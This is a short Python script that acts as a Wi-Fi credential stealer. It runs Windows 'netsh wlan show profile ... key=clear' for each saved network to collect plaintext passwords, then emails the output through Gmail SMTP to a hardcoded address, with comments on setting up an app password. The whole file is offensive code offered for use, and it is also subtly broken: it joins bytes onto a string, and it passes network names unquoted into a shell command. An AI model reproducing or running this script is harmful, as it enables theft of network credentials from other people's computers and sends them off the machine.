#!/usr/bin/env python

import subprocess, smtplib
import re


def send_email(email, password, message):
    # This function sends an email
    server = smtplib.SMTP('smtp.gmail.com', 587) # Connect to Gmail's SMTP server    
    server.starttls() # Upgrade the connection to a secure encrypted SSL/TLS connection
    server.login(email, password) # Log in to the email account
    server.sendmail(email, email, message) # Send the email
    server.quit() # Close the connection to the server    






command = "netsh wlan show profile" # This command retrieves the Wi-Fi profiles stored on the system
networks = subprocess.check_output(command, shell=True).decode('utf-8') # Execute the command and decode the output
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) # Extract the network names using regex


result = "" # Initialize an empty string to store the results
for network in network_names_list:
    command = "netsh wlan show profile " + network + " key=clear" # This command retrieves the Wi-Fi password for each network
    current_result = subprocess.check_output(command, shell=True) # Execute the command 
    result = result + current_result # Append the current result to the final result string




send_email("jhnwck70@gmail.com", "password", result) # Send the output via email
# the password above should be generated by going on to myaccount.google.com/security
# and enabling 2-step verification and then creating an app password for the email account.


